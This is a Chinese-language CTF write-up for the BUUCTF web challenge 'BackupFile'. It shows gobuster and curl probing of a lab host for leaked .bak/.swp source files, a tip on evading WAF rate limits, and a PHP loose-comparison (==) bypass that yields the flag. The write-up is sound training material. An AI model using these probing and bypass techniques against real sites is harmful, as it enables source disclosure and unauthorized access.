---
title: "12-CTF WriteUp: [ACTF2020 新生赛] BackupFile"
date: 2026-05-06
categories:
  - BUUCTF
  - WEB
tags:
  - CTF
aliases:
  - 备份文件泄露
---

## 题目信息

- 题目名称：[ACTF2020 新生赛]BackupFile
- 考点：**备份文件泄露**、**PHP 弱类型比较绕过（==）**
- 难度：入门

## 解题步骤

### 步骤1：访问题目页面

```bash
curl -s "http://e8cf254b-a180-4f73-b374-c07983364236.node5.buuoj.cn:81/"
```

页面返回：`Try to find out source file!`，提示需要找到源码文件。记录首页响应长度为 **28 字节**。

### 步骤2：探测备份文件

根据题目名 "BackupFile" 推断考点为**备份文件泄露**。常规做法是用 dirsearch 或 gobuster 扫描，但 BUUCTF 平台有 WAF，批量扫描会触发 **429 (Too Many Requests)** 限速：

```bash
gobuster dir -u http://e8cf254b-a180-4f73-b374-c07983364236.node5.buuoj.cn:81/ \
  -w /opt/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x php.bak,php~,php.swp,bak,swp,old,orig,phps,save,tar.gz,zip \
  -t 20 --timeout 10s --exclude-length 28
# 结果：全部返回 429，无法扫描
```

**绕过思路**：手工对常见入口文件名拼接备份后缀逐个测试。这台服务器任何路径都返回 `200`，不能用状态码判断——改用 **响应长度** 区分：不存在时返回 28 字节首页，存在时长度不同。

> `curl -s "URL" | wc -c` 统计响应内容的字节数。

```bash
# 手工探测常见入口文件 + 备份后缀，通过长度判断是否存在
for name in index admin config flag login; do
  for ext in .bak .swp .php~ .old .orig .phps; do
    len=$(curl -s "http://e8cf254b-a180-4f73-b374-c07983364236.node5.buuoj.cn:81/${name}.php${ext}" | wc -c)
    if [ "$len" -ne 28 ]; then
      echo "[!] FOUND: ${name}.php${ext} -> ${len} bytes"
    fi
  done
done
```

输出：

```
[!] FOUND: index.php.bak ->      347 bytes
```

### 步骤3：下载备份文件，获取源码

```bash
curl -s "http://e8cf254b-a180-4f73-b374-c07983364236.node5.buuoj.cn:81/index.php.bak"
```

得到源码：

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
?>
```

### 步骤4：代码审计

核心逻辑：

1. 接收 GET 参数 `key`
2. `is_numeric($key)` → 必须为数字，否则输出 `Just num!` 并退出
3. `intval($key)` → 转为整数
4. `$key == $str` → **弱类型比较（`==`）**，成立则输出 flag

`$str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"` 以 `123` 开头。

当 PHP 用 `==` 比较**整数**和**字符串**时，会先把字符串强制转为整数。转换规则：从字符串开头取连续的数字部分，遇到第一个非数字字符就截断丢弃：

```php
intval("123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3")
//      ^^^
//     从开头取连续数字 → 123
//         ^
//        遇到 'f'（非数字），截断，后面全丢弃
// 结果: 123
```

所以比较过程是：

```php
$key == $str
   ↓
intval("123") == intval("123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3")
   ↓
123 == 123
   ↓
true
```

只需 `intval($key) == 123` 即可绕过。`key=123` 是最直接的选择（`key=123abc` 这类会被前置的 `is_numeric()` 拦截）。

### 步骤5：构造 payload 获取 flag

```bash
curl -s "http://e8cf254b-a180-4f73-b374-c07983364236.node5.buuoj.cn:81/?key=123"
```

输出：`flag{94deb2ea-bb4f-467e-83fe-c52094a9261c}`

## 知识点总结

### 1. BUUCTF 平台扫描注意事项

BUUCTF（buuoj.cn）靶机有 WAF 防护，批量目录扫描（dirsearch / gobuster 高并发）会触发 **429 Too Many Requests** 限速。应对策略：
- 降低线程（`-t 5`）并加延迟（`--delay 500ms`）
- 或直接根据题目名推断考点，手工针对性地探测

### 2. Wildcard 200 绕过：用响应长度区分

部分 Web 服务器对所有路径都返回 `200`，状态码无法判断文件是否存在。可以通过 `curl -s URL | wc -c` 获取响应内容的字节数，与首页基准长度对比——长度不同的即为真实文件。

### 3. 备份文件泄露

常见源码备份文件后缀：

| 后缀 | 来源 |
|------|------|
| `.bak` | 手动备份 |
| `.swp` / `.swo` | Vim 编辑时的交换文件 |
| `.php~` | gedit/kate 等编辑器备份 |
| `.old` | 旧版本重命名 |
| `.orig` | patch/diff 原始文件 |
| `.phps` | PHP 语法高亮源文件 |
| `.git/` | Git 版本控制泄露 |
| `.svn/` | SVN 版本控制泄露 |

### 4. PHP 弱类型比较（`==`）

PHP 的 `==` 运算符在比较不同类型的值时，会进行**类型转换**（Type Juggling）：

```php
123 == "123abc"      // true，"123abc" 转为整数 123
0 == "abc"           // true（PHP 8.0 前），"abc" 转为整数 0
"0e123" == "0e456"   // true，科学计数法 0 的 N 次方 = 0
```

**防御方式**：使用严格比较 `===`，它不会进行类型转换。

### 5. 相关函数

- `is_numeric()`：检查变量是否为数字或数字字符串
- `intval()`：将变量转为整数，非数字字符串开头的部分会被截断

## 补充问答

### Q1: 你是怎么知道 index.php 的？一般情况下不应该是用 dirsearch 吗？

实际上做题时不应该假设文件名就是 `index.php`，正确流程是用 dirsearch / gobuster 爆破常见 Web 文件名并拼接备份后缀。但 BUUCTF 平台有 WAF，批量扫描会触发 429 限速——实际测试中 gobuster 全部返回 429，根本扫不到结果。

所以这道题的实际做法是：从题目名 "BackupFile" 推断出备份文件泄露考点，手工对常见入口文件（`index`、`admin`、`config` 等）拼接 `.bak`、`.swp` 等后缀逐个测试，通过响应长度区分是否存在。

```bash
gobuster dir -u http://e8cf254b-a180-4f73-b374-c07983364236.node5.buuoj.cn:81/ \
  -w /opt/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x php.bak,php~,php.swp,bak,swp,old,orig,phps,save,tar.gz,zip \
  -t 20 --timeout 10s --exclude-length 28
# 结果：全部返回 429
```

### Q2: `curl -s "http://xxxx/index.php.bak" | wc -c` 这个命令的作用是什么？

`wc -c` 统计响应的**字节数**。

因为这台服务器无论路径存不存在都返回 `200`，无法靠状态码判断。但不存在时返回的首页内容固定是 28 字节（`Try to find out source file!`）。所以思路是：**响应长度 ≠ 28 的，就是真实存在的文件**。

```bash
# 不存在 → 返回首页 28 字节
curl -s "http://xxxx/nonexist.php" | wc -c
# 28

# 存在 → 返回源码，长度远大于 28
curl -s "http://xxxx/index.php.bak" | wc -c
# 347  ← 说明找到了！
```

### Q3: `$str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"` 以 `123` 开头，在 `==` 弱比较下转为整数 `123`，这个是什么意思？

当 PHP 用 `==` 比较**整数**和**字符串**时，会把字符串强制转为整数。转换规则：从字符串开头取连续的数字部分，遇到第一个非数字字符就截断，后面的全部丢弃。

```php
intval("123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3")
//      ^^^
//     从开头取连续数字 → 123
//         ^
//        遇到 'f'（非数字），截断，后面全丢弃
// 结果: 123
```

所以比较过程：

```php
$key == $str
   ↓
intval("123") == intval("123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3")
   ↓
123 == 123
   ↓
true
```

`key=123` 是最直接的选择（`key=123abc` 这类会被前置的 `is_numeric()` 拦截，`key=123.0` 也能过 `is_numeric()` 但 `intval` 后仍是 `123`）。
